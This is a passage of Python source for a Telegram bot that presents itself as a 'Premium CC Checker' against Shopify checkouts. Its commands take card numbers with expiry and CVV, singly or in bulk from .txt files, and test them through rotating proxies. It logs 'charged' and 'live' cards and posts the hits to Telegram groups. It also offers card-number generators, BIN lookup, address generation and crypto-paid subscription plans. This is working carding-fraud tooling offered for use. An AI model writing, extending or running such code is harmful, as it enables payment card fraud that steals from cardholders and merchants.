        await asyncio.sleep(((now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0) - now).total_seconds())
        await send_backup(OWNER_ID)

router = Router()

def _mask_cc(cc: str) -> str:
    parts = cc.split("|")
    return f"{parts[0][:6]}|**|**|***" if len(parts) == 4 else cc[:6] + "****" + cc[-4:]

def format_public_hit(cc: str, res: Dict[str, Any], bin_info, site: str, checker_uid: int = 0, checker_name: str = "") -> str:
    try:
        cls = res.get("cls", "charged")
        resp_msg = _sanitize_err(res.get("response", "Unknown"))
        amount = float(res.get("amount", 0.0) or 0.0)
        currency = res.get("currency", "USD")
        gateway = res.get("gateway", "Shopify")
        ctime = res.get("check_time", "N/A")
        masked = _mask_cc(cc)
        brand = brand_pe(cc)
        bank, country, flag, card_type = "N/A", "N/A", "🌍", "N/A"
        if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
            bank = str(bin_info.get("Issuer") or "N/A")
            country_data = bin_info.get("Country") or {}
            if isinstance(country_data, dict):
                country = str(country_data.get("Name") or "N/A")
                flag = country_flag(country_data.get("Code", ""))
            card_type = str(bin_info.get("Type") or "N/A").upper()
        if cls == "charged": title = f"{pe('check')} <b>CHARGED HIT</b>"
        elif cls == "approved_nsf": title = f"{pe('online')} <b>LIVE CARD</b>"
        elif cls == "approved_3ds": title = f"{pe('online')} <b>3DS CARD</b>"
        elif cls == "approved_ccn": title = f"{pe('online')} <b>CCN CARD</b>"
        else: title = f"{pe('online')} <b>LIVE CARD</b>"
        type_icon = "gem" if card_type == "CREDIT" else ("diamond" if card_type == "DEBIT" else "star")
        time_of_hit = datetime.now().strftime("%I:%M %p")
        checker_disp = _user_link(checker_uid, checker_name) if checker_uid else sc("GOKU")
        caption = f"{title}\n<blockquote>{brand} <code>{masked}</code>\n{pe('check')} <b>{sc('RESP')}</b> · {esc(resp_msg)}\n{pe('diamond')} <b>{sc('AMOUNT')}</b> · <b>${amount:.2f} {esc(currency)}</b>\n{pe('refresh')} <b>{sc('GATE')}</b> · {esc(gateway)}\n{pe('hourglass')} <b>{sc('TIME')}</b> · {esc(ctime)}\n{pe('shop')} <b>{sc('BANK')}</b> · {esc(bank)}\n{flag} <b>{sc('COUNTRY')}</b> · {esc(country)}\n{pe(type_icon)} <b>{sc('TYPE')}</b> · {esc(card_type)}\n{pe('star')} <b>{sc('CHECKER')}</b> · {checker_disp}\n<i>{time_of_hit}</i>\n{HIDDEN_CREDIT}</blockquote>"
        return caption[:1024]
    except Exception as e:
        return f"Hit! {cc} - {res.get('response', '')}"[:1024]

async def record_charged(cc: str, res: Dict[str, Any], site: str, uid: int = 0, bin_info: Any = None) -> None:
    try:
        async with _get_write_lock():
            with db() as c: c.execute("INSERT INTO charged_hits(cc, site, response, amount, currency, uid, ts) VALUES (?,?,?,?,?,?,?)", (cc, site, res.get("response", "")[:200], float(res.get("amount", 0) or 0), res.get("currency", "USD"), int(uid or 0), datetime.now(timezone.utc).isoformat()))
    except Exception as e: log.error(f"record_charged db: {e}")
    if bin_info is None:
        try: bin_info = await lookup_bin(cc.split("|")[0][:6])
        except Exception as e: bin_info = {"error": str(e)}
    checker_name = ""
    if uid:
        try:
            u = get_user(uid)
            if u: checker_name = u["username"] or ""
        except: pass
    cls = res.get("cls", "charged")
    charged_gc, public_gc = get_setting("charged_gc_id"), get_setting("public_gc_id")
    hit_media = random.choice(IMAGES)
    if charged_gc and _bot_ref and cls == "charged":
        try:
            chat_id = int(charged_gc) if re.fullmatch(r"-?\d+", charged_gc) else charged_gc
            rich_caption = format_public_hit(cc, res, bin_info, site, checker_uid=uid, checker_name=checker_name)
            try: await _bot_ref.send_photo(chat_id, photo=hit_media, caption=rich_caption, parse_mode="HTML")
            except: await _bot_ref.send_message(chat_id, rich_caption, parse_mode="HTML", disable_web_page_preview=True)
        except: pass
    if public_gc and _bot_ref and cls in ("charged", "approved_nsf", "approved_ccn", "approved_3ds", "approved"):
        try:
            pub_chat_id = int(public_gc) if re.fullmatch(r"-?\d+", public_gc) else public_gc
            pub_text = format_public_hit(cc, res, bin_info, site, checker_uid=uid, checker_name=checker_name)
            pub_kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("GO TO BOT"), icon="chat", url=f"https://t.me/{BOT_USERNAME}")]])
            try: sent_msg = await _bot_ref.send_photo(pub_chat_id, photo=hit_media, caption=pub_text, parse_mode="HTML", reply_markup=pub_kb)
            except: sent_msg = await _bot_ref.send_message(pub_chat_id, pub_text, parse_mode="HTML", reply_markup=pub_kb, disable_web_page_preview=True)
            if sent_msg:
                try: await _bot_ref.pin_chat_message(pub_chat_id, sent_msg.message_id, disable_notification=True)
                except: pass
        except: pass

async def send_chat_hit(bot, chat_id, cc, res, site):
    try: bin_info = await lookup_bin(cc.split("|")[0][:6])
    except: bin_info = None
    text = format_result(cc, res, bin_info)
    media = random.choice(IMAGES)
    try: await bot.send_photo(chat_id, photo=media, caption=text, parse_mode="HTML")
    except: await bot.send_message(chat_id, text, parse_mode="HTML")

BAR_GRADIENT = ["🟥", "🟧", "🟨", "🟩"]
def make_bar(pct, width=12):
    filled = int(round(width * max(0, min(100, pct)) / 100))
    return "▰" * filled + "▱" * (width - filled)
def make_fancy_bar(pct):
    filled = int(round(10 * max(0, min(100, pct)) / 100))
    return "".join(BAR_GRADIENT[min(3, i * 4 // 10)] if i < filled else "⬛" for i in range(10))
def spinner_frame(i): return ["◐", "◓", "◑", "◒"][i % 4]
def _fmt_eta(s): return f"{int(s)}s" if s < 60 else f"{int(s)//60}m {int(s)%60}s"

async def edit_admin(cb: CallbackQuery, text: str, kb=None, photo: Optional[str] = None):
    m = cb.message
    photo = photo or IMG_MAIN
    try:
        if m.photo or m.video:
            try: await m.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "not modified" in str(e).lower(): return
                raise
        else:
            try: await m.edit_text(text, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "not modified" in str(e).lower(): return
                raise
    except:
        try:
            if photo: await m.answer_photo(photo=photo, caption=text, parse_mode="HTML", reply_markup=kb)
            else: await m.answer(text, parse_mode="HTML", reply_markup=kb)
        except: await m.answer(text, parse_mode="HTML", reply_markup=kb)

async def safe_edit_media(cb, photo_or_video, caption, kb):
    m = cb.message
    photo_or_video = photo_or_video or IMG_MAIN
    try:
        is_vid = str(photo_or_video).endswith(".mp4")
        if not m.photo and not m.video:
            try: await m.edit_text(caption, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "no text in the message" not in str(e).lower(): raise
        if is_vid: await m.edit_media(media=InputMediaVideo(media=photo_or_video, caption=caption, parse_mode="HTML"), reply_markup=kb)
        else: await m.edit_media(media=InputMediaPhoto(media=photo_or_video, caption=caption, parse_mode="HTML"), reply_markup=kb)
    except TelegramBadRequest as e:
        if "not modified" in str(e).lower(): pass
        else:
            try:
                if str(photo_or_video).endswith(".mp4"): await m.answer_video(video=photo_or_video, caption=caption, parse_mode="HTML", reply_markup=kb)
                else: await m.answer_photo(photo=photo_or_video, caption=caption, parse_mode="HTML", reply_markup=kb)
            except: await m.answer(caption, parse_mode="HTML", reply_markup=kb)
    except: await m.answer(caption, parse_mode="HTML", reply_markup=kb)

# ── UI MENUS ─────────────────────────────────────────────────────────────────
def main_menu_kb(user_id=0):
    # F1: Daily Spin removed. F3: Auth button added as first row (Shopify primary).
    kb = [
        [pbtn("Auth", icon="unlock", color="success", callback_data="menu:auth")],
        [pbtn("Shopify", icon="shop", color="success", callback_data="menu:check"), pbtn("Manage Proxy", icon="link", color="primary", callback_data="menu:proxy")],
        [pbtn("Wishlist", icon="book", color="primary", callback_data="menu:wishlist"), pbtn("Top Users", icon="chart", color="primary", callback_data="menu:top")],
        [pbtn("Gift Credits", icon="gem", color="success", callback_data="menu:gift"), pbtn("Tools", icon="tools", color="primary", callback_data="menu:tools")],
        [pbtn("Info", icon="docs", color="primary", callback_data="menu:info"), pbtn("Contact", icon="chat", color="success", url=get_setting("support_link", "https://t.me/Senselessme"))],
        [pbtn("Close", icon="cross1", color="danger", callback_data="menu:close")],
    ]
    if is_admin(user_id): kb.insert(0, [pbtn("Admin Panel", icon="settings", color="danger", callback_data="menu:admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def info_menu_kb():
    kb = [
        [pbtn("Plans", icon="gem", color="success", callback_data="menu:shop"), pbtn("Profile", icon="user", color="primary", callback_data="menu:account")],
        [pbtn("Commands", icon="docs", color="primary", callback_data="menu:commands")],
        [pbtn("Back", icon="back", color="primary", callback_data="menu:main")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_kb(): return InlineKeyboardMarkup(inline_keyboard=[[pbtn("Back", icon="back", color="primary", callback_data="menu:main")]])
def tools_kb(): return InlineKeyboardMarkup(inline_keyboard=[
    [pbtn("VISA Gen", icon="gem", color="success", callback_data="gen:4"), pbtn("MASTER Gen", icon="gem2", color="success", callback_data="gen:5")],
    [pbtn("AMEX Gen", icon="gem3", color="success", callback_data="gen:34")],
    [pbtn("BIN Lookup", icon="shop", color="primary", callback_data="tool:bin"), pbtn("CC Formatter", icon="pen", color="primary", callback_data="tool:format")],
    [pbtn("Address Gen", icon="user", color="primary", callback_data="tool:addr")],
    [pbtn("Back", icon="back", color="primary", callback_data="menu:main")]
])
def shop_kb():
    rows = [[pbtn(f"{p['label']}", icon="star", color="success", callback_data=f"buy:{k}")] for k, p in STAR_PRODUCTS.items()]
    rows.append([pbtn("Buy with USDT", icon="gem", color="primary", callback_data="shop:buy_usdt")])
    rows.append([pbtn("Buy with TON", icon="gem2", color="primary", callback_data="shop:buy_ton")])
    rows.append([pbtn("Back", icon="back", callback_data="menu:info")])
    return InlineKeyboardMarkup(inline_keyboard=rows)
def proxy_kb(uid): return InlineKeyboardMarkup(inline_keyboard=[[pbtn("Add Proxy", icon="add", color="success", callback_data="proxy:add")], [pbtn("Revalidate All", icon="refresh", color="primary", callback_data="proxy:check")], [pbtn("List Proxies", icon="docs", color="primary", callback_data="proxy:list")], [pbtn("Clear All", icon="trash", color="danger", callback_data="proxy:clear")], [pbtn("Back", icon="back", color="primary", callback_data="menu:tools")]])
def limited_admin_kb(): return InlineKeyboardMarkup(inline_keyboard=[[pbtn("Generate Code", icon="add", color="success", callback_data="admin:gen_code")], [pbtn("Broadcast", icon="bell", color="primary", callback_data="admin:broadcast")], [pbtn("Close", icon="cross1", color="danger", callback_data="admin:close")]])

def admin_main_kb(uid=0):
    if uid and is_limited_admin(uid) and not is_full_admin(uid): return limited_admin_kb()
    maint = get_setting("maintenance") == "1"
    rows = [
        [pbtn("Dashboard", icon="chart", color="primary", callback_data="admin:stats"), pbtn(f"Maint: {'ON' if maint else 'OFF'}", icon="warn_red" if maint else "online", color="danger" if maint else "success", callback_data="admin:toggle_maint")],
        [pbtn("Bot Settings", icon="settings", color="primary", callback_data="admin:bot_settings"), pbtn("Pricing & Plans", icon="gem", color="success", callback_data="admin:plans_mgr")],
        [pbtn("User Manager", icon="user", color="success", callback_data="admin:user_mgr"), pbtn("Admin Manager", icon="settings", color="success", callback_data="admin:manage_admins")],
        [pbtn("Sites Manager", icon="shop", color="primary", callback_data="admin:sites"), pbtn("API Manager", icon="link", color="primary", callback_data="admin:apis")],
        [pbtn("Force Channels", icon="unlock", color="primary", callback_data="admin:force_list"), pbtn("Proxy Settings", icon="link", color="primary", callback_data="admin:proxy_mgr")],
        [pbtn("Charged Logs", icon="gem", color="success", callback_data="admin:charged_logs"), pbtn("System Logs", icon="docs", color="primary", callback_data="admin:sys_logs")],
        [pbtn("Broadcast", icon="bell", color="primary", callback_data="admin:broadcast"), pbtn("Promo Codes", icon="add", color="success", callback_data="admin:promos")],
        [pbtn("DB Backup", icon="docs", color="success", callback_data="admin:backup_now"), pbtn("DB Restore", icon="refresh", color="danger", callback_data="admin:restore_db")],
        [pbtn("Free Trial", icon="star", color="primary", callback_data="admin:trial_setup"), pbtn("Crypto Wallets", icon="gem2", color="success", callback_data="admin:wallet_setup")],
        [pbtn("Clear Cache", icon="trash", color="danger", callback_data="admin:clear_cache"), pbtn("Close Panel", icon="cross1", color="danger", callback_data="admin:close")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

user_cooldowns = {}
def refresh_daily(uid):
    today = datetime.now(timezone.utc).date().isoformat()
    with db() as c:
        row = c.execute("SELECT last_credit_date, last_check_date FROM users WHERE uid=?", (uid,)).fetchone()
        if row:
            if row["last_credit_date"] != today:
                daily_cr = int(get_setting("daily_credits", "50"))
                c.execute("UPDATE users SET credits=credits+?, last_credit_date=? WHERE uid=?", (daily_cr, today, uid))
            if row["last_check_date"] != today: c.execute("UPDATE users SET daily_checks=0, last_check_date=? WHERE uid=?", (today, uid))

def consume_quota(uid):
    if is_admin(uid): return True, "admin"
    ensure_user(uid); refresh_daily(uid); u = get_user(uid)
    if not u: return False, "limit"
    plan_key = u["plan"] if u["plan"] in PLANS else "free"
    if plan_key in ("premium", "max", "unlimited"):
        with db() as c: c.execute("UPDATE users SET daily_checks=daily_checks+1, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "unlimited"
    if u["daily_checks"] < PLANS[plan_key]["limit"]:
        with db() as c: c.execute("UPDATE users SET daily_checks=daily_checks+1, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "daily"
    if u["credits"] >= 2:
        with db() as c: c.execute("UPDATE users SET credits=credits-2, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "credits"
    return False, "limit"

def apply_streak(uid):
    today, yesterday = datetime.now(timezone.utc).date().isoformat(), (datetime.now(timezone.utc).date() - timedelta(days=1)).isoformat()
    result = {"streak": 0, "reward": None, "credits": 0, "new_day": False, "upgrade": None}
    try:
        with db() as c:
            row = c.execute("SELECT streak, last_streak_date, credits FROM users WHERE uid=?", (uid,)).fetchone()
            if not row: return result
            streak, last_date, credits = row["streak"] or 0, row["last_streak_date"] or "", row["credits"] or 0
            if last_date == today: result.update(streak=streak, credits=credits); return result
            streak = (streak + 1) if last_date == yesterday else 1
            reward = None; upgrade_plan = None
            if streak == 7: credits += 50; reward = "+50 credits (7-day streak)"
            elif streak == 30: upgrade_plan = "pro"; reward = "1-day Pro trial (30-day streak)"
            c.execute("UPDATE users SET streak=?, last_streak_date=?, credits=? WHERE uid=?", (streak, today, credits, uid))
            result.update(streak=streak, reward=reward, credits=credits, new_day=True, upgrade=upgrade_plan)
    except: pass
    # FIX: hoist upgrade_user out of db() context to avoid nested lock mid-transaction
    if result.get("upgrade"):
        try: upgrade_user(uid, result["upgrade"], 1)
        except: pass
    return result

LOADING_FRAMES = [f"{pe('loading')} <b>{sc('Connecting')}</b>", f"{pe('refresh')} <b>{sc('Checking')}</b>", f"{pe('hourglass')} <b>{sc('Processing')}</b>", f"{pe('diamond')} <b>{sc('Analyzing')}</b>"]
async def animate_loading(msg, cc_line, stop_event):
    i = 0
    while not stop_event.is_set():
        try: await msg.edit_text(f"{spinner_frame(i)} {LOADING_FRAMES[i % len(LOADING_FRAMES)]}\n<blockquote><code>{cc_line}</code></blockquote>", parse_mode="HTML")
        except: pass
        i += 1
        try: await asyncio.wait_for(stop_event.wait(), timeout=1.2)
        except asyncio.TimeoutError: pass

def format_result(cc: str, res: Dict[str, Any], bin_info=None) -> str:
    try:
        cls = res.get("cls", "declined")
        resp_msg = _sanitize_err(res.get("response", "Unknown") or "Unknown")
        amount = float(res.get("amount", 0.0) or 0.0)
        currency = res.get("currency", "USD") or "USD"
        gateway = res.get("gateway", "Shopify") or "Shopify"
        ctime = res.get("check_time", "") or ""
        if cls in ("error", "timeout", "proxy_error", "site_error", "rate_limited"):
            icon = pe("warn_red") if cls in ("proxy_error","site_error") else pe("cross1")
            label = {"error":"Check Failed","timeout":"Timed Out","proxy_error":"Proxy Error","site_error":"Site Error","rate_limited":"Rate Limited"}.get(cls,"Failed")
            return f"{icon} <b>{sc(label)}</b>\n<blockquote>{brand_pe(cc)} <code>{cc}</code>\n{pe('warn')} {esc(resp_msg[:120])}\n{HIDDEN_CREDIT}</blockquote>"
        title_map = {"charged": f"{pe('check')} <b>{sc('CHARGED HIT')}</b>", "approved_3ds": f"{pe('online')} <b>{sc('LIVE CARD · 3DS')}</b>", "approved_nsf": f"{pe('online')} <b>{sc('LIVE CARD · NSF')}</b>", "approved_ccn": f"{pe('online')} <b>{sc('LIVE CARD · CCN')}</b>", "approved": f"{pe('online')} <b>{sc('LIVE CARD')}</b>", "captcha": f"{pe('warn')} <b>{sc('CAPTCHA · RETRY')}</b>", "declined": f"{pe('cross2')} <b>{sc('DECLINED')}</b>"}
        title = title_map.get(cls, f"{pe('cross2')} <b>{sc('DECLINED')}</b>")
        bin_line = ""
        if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
            country_data = bin_info.get("Country") or {}
            if not isinstance(country_data, dict): country_data = {}
            _ctype = str(bin_info.get("Type") or "N/A").upper()
            _ctype_icon = "gem" if _ctype == "CREDIT" else ("diamond" if _ctype == "DEBIT" else "star")
            bin_line = f"{pe('shop')}  <b>{sc('Bank')}</b>  ·  {esc(bin_info.get('Issuer', 'N/A') or 'N/A')}\n{country_flag(country_data.get('Code', ''))}  <b>{sc('Country')}</b>  ·  {esc(country_data.get('Name', 'N/A') or 'N/A')}\n{pe(_ctype_icon)}  <b>{sc('Type')}</b>  ·  {esc(_ctype)}\n"
        time_line = f"{pe('hourglass')}  <b>{sc('Time')}</b>  ·  {esc(ctime)}\n" if ctime else ""
        return f"{title}\n<blockquote>{brand_pe(cc)}  <code>{cc}</code></blockquote>\n<blockquote>{pe('check2')}  <b>{sc('Resp')}</b>  ·  {esc(resp_msg)}\n{pe('gem')}  <b>{sc('Amount')}</b>  ·  <b>${amount:.2f} {esc(currency)}</b>\n{pe('diamond')}  <b>{sc('Gate')}</b>  ·  {esc(gateway)}\n{time_line}{bin_line}\n{HIDDEN_CREDIT}</blockquote>"
    except:
        return f"{pe('warn')} <b>Result</b>\n<blockquote><code>{esc(cc)}</code>\n{esc(str(res.get('cls', 'unknown')))} · {esc(str(res.get('response', '')))}</blockquote>"

def welcome_text(user_row, first_name):
    bot_name = get_setting("bot_name", "NOVAL AUTO SHOPIFY")
    return (
        f"{pe('up')} <b>[=] Bot » {sc(bot_name)} » {pe('up')}</b>\n"
        f"{pe('gem')} <b>[=] Type » Premium CC Checker » {pe('gem')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('up')} <b>[=] Gate » Shopify » {pe('up')}</b>\n"
        f"{pe('link')} <b>[=] Proxy » HTTP · SOCKS4 · SOCKS5 » {pe('link')}</b>\n"
        f"{pe('up')} <b>[=] Speed » Multi-worker · Rotating » {pe('up')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('diamond')} <b>[=] Menu » Select option below » {pe('diamond')}</b>"
    )

def parse_site_list(raw: str):
    parsed, seen = [], set()
    for l in re.split(r"[\r\n,;]+", raw or ""):
        s = l.strip().lower()
        if not s or s.startswith("#"): continue
        s = s[8:] if s.startswith("https://") else s[7:] if s.startswith("http://") else s
        s = s.split("/")[0]
        if s and s not in seen: seen.add(s); parsed.append(s)
    return parsed

def format_site_checker_report(result: Dict[str, Any]) -> str:
    lines = [f"{pe('check')} <b>{sc('Site Checker')}</b>", f"<blockquote>{pe('shop')} {sc('Total')}: <b>{result['total']}</b>", f"{pe('check')} {sc('Clean')}: <b>{len(result['clean'])}</b>", f"{pe('warn')} {sc('Captcha')}: <b>{len(result['captcha'])}</b>", f"{pe('cross2')} {sc('Dead')}: <b>{len(result['dead'])}</b></blockquote>"]
    if result["clean"]:
        lines.append(f"<blockquote><b>{sc('Clean sites')}:</b>")
        for c in result["clean"][:20]: lines.append(f"{pe('check')} <code>{esc(c['site'])}</code> · ${c['price']:.2f}")
        if len(result["clean"]) > 20: lines.append(f"<i>...and {len(result['clean'])-20} more</i>")
        lines.append("</blockquote>")
    return "\n".join(lines)

async def run_site_checker_flow(msg: Message, raw_sites: str):
    sites = parse_site_list(raw_sites)
    if not sites: return await msg.answer(f"{pe('cross1')} <b>{sc('No sites provided')}</b>", parse_mode="HTML")
    st = await msg.answer(f"{pe('loading')} <b>{sc('Site Checker')}</b>\n<blockquote>{sc('Testing')} {len(sites)} {sc('sites')}...</blockquote>", parse_mode="HTML")
    result = await check_sites_clean(sites)
    try: await st.edit_text(format_site_checker_report(result), parse_mode="HTML")
    except: await msg.answer(format_site_checker_report(result), parse_mode="HTML")

async def redeem_code(msg: Message, code: str) -> None:
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    code = code.strip().upper()
    with db() as c:
        row = c.execute("SELECT * FROM redeem_codes WHERE code=?", (code,)).fetchone()
        if not row: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid code')}</b>", parse_mode="HTML")
        if row["used"] >= row["max_uses"]: return await msg.answer(f"{pe('cross1')} <b>{sc('Code fully used')}</b>", parse_mode="HTML")
        if c.execute("SELECT 1 FROM redeem_log WHERE code=? AND uid=?", (code, uid)).fetchone(): return await msg.answer(f"{pe('cross1')} <b>{sc('Already redeemed')}</b>", parse_mode="HTML")
        c.execute("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
        c.execute("INSERT INTO redeem_log(code, uid, used_at) VALUES (?,?,?)", (code, uid, datetime.now(timezone.utc).isoformat()))
    upgrade_user(uid, row["plan"], row["days"])
    await msg.answer(f"{pe('check')} <b>{sc('Code Redeemed')}</b>\n<blockquote>{pe('gem')} {sc('Plan')}: <b>{PLANS[row['plan']]['name']}</b>\n{pe('hourglass')} {sc('Days')}: <b>{row['days']}</b>\n{HIDDEN_CREDIT}</blockquote>", parse_mode="HTML")

async def broadcast_all(bot, *, text: Optional[str] = None, photo: Optional[str] = None, caption: Optional[str] = None, only_premium=False) -> Dict[str, int]:
    q = "SELECT uid FROM users WHERE banned=0"
    if only_premium: q += " AND plan IN ('premium', 'max', 'unlimited')"
    with db() as c: users = c.execute(q).fetchall()
    ok, fail = 0, 0
    for u in users:
        try:
            if photo: await bot.send_photo(u["uid"], photo=photo, caption=caption or "", parse_mode="HTML")
            else: await bot.send_message(u["uid"], text or "", parse_mode="HTML")
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    return {"ok": ok, "fail": fail, "total": len(users)}

# ── USER COMMANDS ────────────────────────────────────────────────────────────
@router.message(CommandStart())
async def cmd_start(msg: Message, command: CommandObject):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")

    if command and command.args and command.args.startswith("ref_"):
        try:
            referrer_id = int(command.args.split("_")[1])
            user = get_user(uid)
            if user and referrer_id != uid and user["referred_by"] == 0:
                ensure_user(referrer_id)
                with db() as c:
                    c.execute("UPDATE users SET referred_by=? WHERE uid=?", (referrer_id, uid))
                    c.execute("UPDATE users SET refer_count=refer_count+1 WHERE uid=?", (referrer_id,))
                    r = c.execute("SELECT refer_count, plan FROM users WHERE uid=?", (referrer_id,)).fetchone()
                    cnt = r["refer_count"]
                    if cnt == 5: c.execute("UPDATE users SET credits=credits+100 WHERE uid=?", (referrer_id,))
                    elif cnt == 20: upgrade_user(referrer_id, "premium")
                    elif cnt == 50: upgrade_user(referrer_id, "max")
                    elif cnt == 100: upgrade_user(referrer_id, "unlimited")
        except: pass

    if not await check_force_sub(msg.bot, uid):
        kb_rows = [[pbtn(f"{sc('Join')} {ch['title'][:25] or sc('Channel')}", icon="chat", color="primary", url=ch["invite_link"] or f"https://t.me/{ch['chat_id'].lstrip('@')}")] for ch in force_channels_list(enabled_only=True)]
        kb_rows.append([pbtn(sc("Verify Joined"), icon="check", color="success", callback_data="verify_sub")])
        text = f"{pe('unlock')} <b>[=] Access Restricted » 🛡</b>\n〰️〰️〰️〰️〰️〰️〰️〰️\n{pe('star')} <b>[=] Info » You must join our channel and group {pe('star')}</b>\n{pe('link')} <b>[=] Step » Tap Join buttons below then Verify {pe('link')}</b>"
        return await msg.answer(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))

    streak, user = apply_streak(uid), get_user_or_create(uid, msg.from_user.username or "")
    caption = welcome_text(user, msg.from_user.first_name) + (f"\n\n{pe('star')} <b>{sc('Streak Reward')}!</b> {streak['reward']}" if streak["reward"] else "")
    media = get_setting("asset_VID_MAIN") or random.choice(VIDEOS)
    try: await msg.answer_video(video=media, caption=caption, reply_markup=main_menu_kb(uid))
    except: await msg.answer(caption, reply_markup=main_menu_kb(uid))

@router.message(Command("id"))
async def cmd_id(msg: Message):
    await msg.answer(f"{pe('link')} <b>{sc('Chat Info')}</b>\n<blockquote>{pe('chat')} {sc('Title')}: <b>{esc(getattr(msg.chat, 'title', None) or msg.chat.type)}</b>\n{pe('diamond')} {sc('Type')}: <b>{msg.chat.type}</b>\n{pe('num1')} {sc('Chat ID')}: <code>{msg.chat.id}</code>\n{pe('user')} {sc('Your ID')}: <code>{msg.from_user.id}</code></blockquote>", parse_mode="HTML")

@router.message(Command("panel", "admin"))
async def cmd_panel(msg: Message):
    if not is_admin(msg.from_user.id): return
    await msg.answer_photo(photo=IMG_MAIN, caption=f"{pe('settings')} <b>{sc('Admin Panel')}</b>", parse_mode="HTML", reply_markup=admin_main_kb(msg.from_user.id))

@router.message(Command("sh", "check"))
async def cmd_check(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b> <code>/sh CC|MM|YY|CVV</code>", parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>", parse_mode="HTML")
    await process_check_logic(msg, cc, msg.bot, mode="shopify")

@router.message(Command("auth"))
async def cmd_auth(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b> <code>/auth CC|MM|YY|CVV</code>", parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>", parse_mode="HTML")
    await process_check_logic(msg, cc, msg.bot, mode="auth")

@router.message(Command("redeem"))
async def cmd_redeem(msg: Message):
    if get_setting("maintenance") == "1" and not is_admin(msg.from_user.id): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('gem2')} <b>{sc('Redeem Code')}</b>\n<blockquote>{pe('docs')} {sc('Usage')}: <code>/redeem CODE</code></blockquote>", parse_mode="HTML")
    await redeem_code(msg, args[1])

@router.message(Command("format"))
async def cmd_format(msg: Message):
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('docs')} <b>Usage:</b> <code>/format 4111111111111111|12|25|123</code>", parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc: return await msg.answer(f"{pe('cross1')} <b>Invalid card format.</b>", parse_mode="HTML")
    await msg.answer(f"{pe('check')} <b>Formatted:</b>\n<blockquote><code>{cc}</code></blockquote>", parse_mode="HTML")

@router.message(Command("msh", "mauth"))
async def cmd_mass_check(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    user = get_user(uid)
    mode = "shopify" if msg.text.startswith("/msh") else "auth"
    if not user or user["banned"]: return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>", parse_mode="HTML")
    cards = []
    args = msg.text.split(maxsplit=1)
    if len(args) > 1: cards.extend(args[1].replace(",", " ").replace("\n", " ").split())
    if msg.reply_to_message:
        replied = msg.reply_to_message
        if replied.text: cards.extend(replied.text.replace(",", "\n").split())
        elif replied.document:
            doc = replied.document
            if not (doc.file_name or "").lower().endswith(".txt") or (doc.file_size or 0) > 2 * 1024 * 1024: return await msg.answer(f"{pe('cross1')} <b>{sc('Only .txt <2MB')}</b>", parse_mode="HTML")
            st = await msg.answer(f"{pe('loading')} <b>{sc('Downloading')}...</b>", parse_mode="HTML")
            try: cards.extend(re.split(r"[\s,;]+", (await msg.bot.download_file((await msg.bot.get_file(doc.file_id)).file_path)).read().decode("utf-8", errors="ignore")))
            except Exception as e: return await st.edit_text(f"{pe('cross1')} <b>{sc('Failed')}:</b> {esc(_sanitize_err(str(e)))}", parse_mode="HTML")
            try: await st.delete()
            except: pass
    if not cards: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b>\n<blockquote>{pe('pen')} <code>/{msg.text.split()[0][1:]} cc|mm|yy|cvv</code>\n{pe('docs')} {sc('or reply to a .txt file')}</blockquote>", parse_mode="HTML")
    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c)
        if n and n not in seen: normalized.append(n); seen.add(n)
    if not normalized: return await msg.answer(f"{pe('docs')} <b>{sc('No valid cards')}</b>", parse_mode="HTML")
    if not is_admin(uid):
        pk, limit = plan_of(uid), PLANS[plan_of(uid)].get("mass_limit", 100)
